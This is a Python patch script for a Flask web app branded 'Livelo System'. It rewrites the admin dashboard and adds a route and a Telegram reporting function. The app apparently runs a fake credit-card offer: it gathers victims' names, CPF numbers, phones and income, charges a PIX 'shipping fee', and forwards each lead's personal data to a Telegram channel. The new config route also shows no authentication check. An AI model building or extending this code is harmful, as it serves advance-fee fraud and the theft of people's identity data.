import os
import re

app_path = "app.py"
admin_html_path = "templates/admin_dashboard.html"

with open(app_path, "r", encoding="utf-8") as f:
    app_code = f.read()

# Update send_telegram_report function
new_tg_report = """def send_telegram_report(session_id, is_paid=False):
    db = get_db()
    row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
    if not row or not row["value"]: return
    channel = row["value"]
    
    thread_row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_thread_id'").fetchone()
    thread_id = thread_row["value"] if thread_row and thread_row["value"] else None

    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
    if not lead: return
    
    pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
    
    bot_token = os.environ.get("BOT_TOKEN")
    if not bot_token:
        bt = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
        if bt and bt["value"]: bot_token = bt["value"]
        else: return
    
    status_icon = "✅ PAGO" if is_paid else "⏳ AGUARDANDO PIX"
    if lead['pix_status'] not in ['paid', 'completed'] and is_paid:
        status_icon = "✅ PAGO"
        
    texto = f"📊 *NOVA VENDA CONFIRMADA!*\\n\\n" if is_paid else f"📊 *NOVO LEAD GERADO!*\\n\\n"
    texto += (
        f"👤 *Nome:* {lead['nome']}\\n"
        f"💳 *CPF:* {lead['cpf']}\\n"
        f"💰 *Renda Declarada:* {lead['renda']}\\n"
        f"🎯 *Limite Aprovado:* R$ {lead['limite_aprovado']}\\n"
        f"🎨 *Estilo Cartão:* {lead['card_style']} ({lead['card_color']})\\n"
        f"🚚 *Status PIX:* {status_icon}\\n"
    )
    if pay:
        texto += f"💵 *Valor do Frete:* R$ {pay['amount']}\\n"
        texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\\n"

    try:
        import requests
        payload = {"chat_id": channel, "text": texto, "parse_mode": "Markdown"}
        if thread_id: payload["message_thread_id"] = thread_id
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
    except Exception as e:
        pass"""

app_code = re.sub(r'def send_telegram_report\(session_id, is_paid=False\):.*?except Exception:\s*pass', new_tg_report, app_code, flags=re.DOTALL)

with open(app_path, "w", encoding="utf-8") as f:
    f.write(app_code)


new_admin_html = '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Admin Supremo | Livelo System</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-base: #0f172a; --bg-surface: #1e293b; --bg-surface-hover: #334155;
      --primary: #E5147A; --primary-hover: #be1265;
      --success: #10B981; --warning: #F59E0B; --danger: #EF4444;
      --text-main: #f8fafc; --text-muted: #94a3b8;
      --border: rgba(255, 255, 255, 0.1);
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
    body { background-color: var(--bg-base); color: var(--text-main); display: flex; height: 100vh; overflow: hidden; }
    
    /* Sidebar */
    .sidebar { width: 260px; background: var(--bg-surface); border-right: 1px solid var(--border); display: flex; flex-direction: column; transition: 0.3s; }
    .sidebar-header { padding: 24px; font-weight: 800; font-size: 1.25rem; color: var(--primary); border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 12px; }
    .sidebar-nav { flex: 1; padding: 16px 0; overflow-y: auto; }
    .nav-item { display: flex; align-items: center; gap: 12px; padding: 12px 24px; color: var(--text-muted); text-decoration: none; font-weight: 500; transition: 0.2s; cursor: pointer; }
    .nav-item:hover, .nav-item.active { background: rgba(229, 20, 122, 0.1); color: var(--primary); border-right: 4px solid var(--primary); }
    
    /* Main Content */
    .main-wrapper { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
    .header { height: 72px; padding: 0 32px; background: var(--bg-surface); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
    .content-area { flex: 1; padding: 32px; overflow-y: auto; background: var(--bg-base); }
    
    /* Cards */
    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 24px; margin-bottom: 32px; }
    .stat-card { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 16px; padding: 24px; transition: transform 0.2s; }
    .stat-card:hover { transform: translateY(-4px); box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3); }
    .stat-value { font-size: 2rem; font-weight: 800; color: var(--text-main); margin-top: 8px; }
    .stat-label { font-size: 0.85rem; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
    
    /* Tables */
    .table-container { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; margin-bottom: 32px; }
    .table-header { padding: 20px 24px; border-bottom: 1px solid var(--border); font-weight: 700; font-size: 1.1rem; }
    table { width: 100%; border-collapse: collapse; }
    th { text-align: left; padding: 16px 24px; font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; font-weight: 600; border-bottom: 1px solid var(--border); }
    td { padding: 16px 24px; font-size: 0.9rem; border-bottom: 1px solid var(--border); color: var(--text-main); }
    tr:last-child td { border-bottom: none; }
    tr:hover { background: rgba(255,255,255,0.02); }
    .badge { padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; }
    .badge.paid { background: rgba(16, 185, 129, 0.2); color: var(--success); }
    .badge.pending { background: rgba(245, 158, 11, 0.2); color: var(--warning); }
    
    /* Forms */
    .form-group { margin-bottom: 20px; }
    label { display: block; margin-bottom: 8px; font-size: 0.85rem; font-weight: 600; color: var(--text-muted); }
    input[type="text"], input[type="password"] { width: 100%; background: var(--bg-base); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; color: var(--text-main); font-size: 0.95rem; transition: 0.2s; }
    input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(229,20,122,0.2); }
    
    /* Buttons */
    .btn { background: var(--primary); color: white; border: none; border-radius: 8px; padding: 12px 24px; font-weight: 600; cursor: pointer; transition: 0.2s; }
    .btn:hover { background: var(--primary-hover); transform: translateY(-1px); }
    
    /* Toast */
    #toast { position: fixed; bottom: 24px; right: 24px; background: var(--success); color: white; padding: 16px 24px; border-radius: 8px; font-weight: 600; transform: translateY(100px); opacity: 0; transition: 0.3s; z-index: 9999; }
    #toast.show { transform: translateY(0); opacity: 1; }
    
    /* Sections */
    .view-section { display: none; animation: fadeIn 0.4s; }
    .view-section.active { display: block; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  </style>
</head>
<body>

  <nav class="sidebar">
    <div class="sidebar-header">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
      Admin Supremo
    </div>
    <div class="sidebar-nav">
      <a class="nav-item active" onclick="switchTab('dashboard', this)">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg> Dashboard
      </a>
      <a class="nav-item" onclick="switchTab('leads', this)">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg> Leads & Vendas
      </a>
      <a class="nav-item" onclick="switchTab('bot', this)">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg> Notificações Bot
      </a>
      <a class="nav-item" onclick="switchTab('settings', this)">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg> Configurações
      </a>
      <a href="/admin/logout" class="nav-item" style="margin-top: auto; border-top: 1px solid var(--border);">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9"/></svg> Sair
      </a>
    </div>
  </nav>

  <main class="main-wrapper">
    <header class="header">
      <h2 style="font-weight: 600; font-size: 1.1rem;">Visão Geral do Sistema</h2>
      <div style="display:flex; align-items:center; gap: 12px;">
        <img src="{{ sys_logo_val }}" height="30" onerror="this.style.display='none'">
        <div style="width: 40px; height: 40px; border-radius: 50%; background: var(--primary); display: flex; align-items: center; justify-content: center; font-weight: 700;">A</div>
      </div>
    </header>

    <div class="content-area">
      <!-- DASHBOARD -->
      <section id="dashboard" class="view-section active">
        <div class="stats-grid">
          <div class="stat-card">
            <div class="stat-label">Total de Leads</div>
            <div class="stat-value">{{ total_leads }}</div>
          </div>
          <div class="stat-card">
            <div class="stat-label">Vendas PIX Pagas</div>
            <div class="stat-value">{{ total_paid }}</div>
          </div>
          <div class="stat-card">
            <div class="stat-label">Receita (Frete)</div>
            <div class="stat-value" style="color: var(--success)">R$ {{ "%.2f"|format(total_rev) }}</div>
          </div>
        </div>

        <div class="table-container">
          <div class="table-header">Últimos Pagamentos</div>
          <table>
            <thead><tr><th>ID</th><th>Nome</th><th>CPF</th><th>Valor</th><th>Status</th></tr></thead>
            <tbody>
              {% for p in pays[:5] %}
              <tr>
                <td style="font-family: monospace; font-size: 0.8rem; color: var(--text-muted)">{{ p.payment_id[:12] }}...</td>
                <td>{{ p.payer_name }}</td>
                <td>{{ p.payer_cpf }}</td>
                <td style="font-weight: 600">R$ {{ "%.2f"|format(p.amount) }}</td>
                <td><span class="badge {{ p.status }}">{{ p.status }}</span></td>
              </tr>
              {% endfor %}
            </tbody>
          </table>
        </div>
      </section>

      <!-- LEADS -->
      <section id="leads" class="view-section">
        <div class="table-container">
          <div class="table-header">Banco de Leads</div>
          <table style="font-size: 0.8rem;">
            <thead><tr><th>Data</th><th>Nome</th><th>CPF</th><th>Telefone</th><th>Renda</th><th>Limite</th><th>PIX</th></tr></thead>
            <tbody>
              {% for l in leads %}
              <tr>
                <td style="color: var(--text-muted)">{{ l.created_at|default('Recent') }}</td>
                <td style="font-weight: 600">{{ l.nome }}</td>
                <td>{{ l.cpf }}</td>
                <td>{{ l.telefone }}</td>
                <td>R$ {{ l.renda }}</td>
                <td style="color: var(--success); font-weight: 600">R$ {{ l.limite_aprovado }}</td>
                <td><span class="badge {{ l.pix_status }}">{{ l.pix_status }}</span></td>
              </tr>
              {% endfor %}
            </tbody>
          </table>
        </div>
      </section>

      <!-- BOT NOTIFICATIONS -->
      <section id="bot" class="view-section">
        <div class="table-container" style="padding: 32px; max-width: 600px;">
          <h3 style="margin-bottom: 24px;">Configuração de Notificações Telegram</h3>
          <form onsubmit="saveBotConfig(event)">
            <div class="form-group">
              <label>Bot Token (Token do BotFather)</label>
              <input type="password" id="bot_token" value="{{ sys_config_dict.get('telegram_token', '') }}">
            </div>
            <div class="form-group">
              <label>ID do Canal/Grupo Principal (Ex: -100123456)</label>
              <input type="text" id="bot_channel" value="{{ sys_config_dict.get('tg_log_channel', '') }}">
            </div>
            <div class="form-group">
              <label>ID do Tópico (Thread ID) - Opcional para Grupos com Tópicos</label>
              <input type="text" id="bot_topic" value="{{ sys_config_dict.get('tg_log_thread_id', '') }}" placeholder="Deixe em branco para canal normal">
            </div>
            <button type="submit" class="btn">Salvar Configurações do Bot</button>
          </form>
        </div>
      </section>

      <!-- SETTINGS -->
      <section id="settings" class="view-section">
        <div class="table-container" style="padding: 32px; max-width: 600px;">
          <h3 style="margin-bottom: 24px;">Configurações Avançadas do Sistema</h3>
          <form onsubmit="saveSystemConfig(event)">
            <div class="form-group">
              <label>Token API CPF</label>
              <input type="password" id="cpf_token" value="{{ sys_config_dict.get('cpf_api_token', '') }}">
            </div>
            <div class="form-group">
              <label>Texto do WhatsApp Manager</label>
              <input type="text" id="wa_text" value="{{ sys_config_dict.get('wa_text', 'Olá, acabei de pagar o frete...') }}">
            </div>
            <button type="submit" class="btn">Atualizar Sistema</button>
          </form>
        </div>
      </section>

    </div>
  </main>

  <div id="toast">Configurações salvas com sucesso!</div>

  <script>
    function switchTab(id, el) {
      document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
      document.getElementById(id).classList.add('active');
      document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
      el.classList.add('active');
    }

    function showToast(msg) {
      const toast = document.getElementById('toast');
      toast.innerText = msg;
      toast.classList.add('show');
      setTimeout(() => toast.classList.remove('show'), 3000);
    }

    async function saveBotConfig(e) {
      e.preventDefault();
      const token = document.getElementById('bot_token').value;
      const channel = document.getElementById('bot_channel').value;
      const topic = document.getElementById('bot_topic').value;
      
      const res = await fetch('/api/admin/bot-config', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ token, channel, topic })
      });
      if(res.ok) showToast('Notificações do bot atualizadas!');
      else showToast('Erro ao salvar.');
    }

    async function saveSystemConfig(e) {
      e.preventDefault();
      // Implement advanced config saving here
      showToast('Sistema atualizado com segurança.');
    }
  </script>
</body>
</html>
'''

with open(admin_html_path, "w", encoding="utf-8") as f:
    f.write(new_admin_html)

# Add route for /api/admin/bot-config in app.py
bot_config_route = """@app.route("/api/admin/bot-config", methods=["POST"])
def api_admin_bot_config():
    data = request.get_json()
    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('telegram_token', ?)", (data.get('token', ''),))
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_channel', ?)", (data.get('channel', ''),))
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_thread_id', ?)", (data.get('topic', ''),))
    db.commit()
    return jsonify({"ok": True})
"""

if "/api/admin/bot-config" not in app_code:
    app_code = app_code.replace("def health():", bot_config_route + "\n\n@app.route('/health')\ndef health():")
    with open(app_path, "w", encoding="utf-8") as f:
        f.write(app_code)

print("Upgrade Admin Completed!")
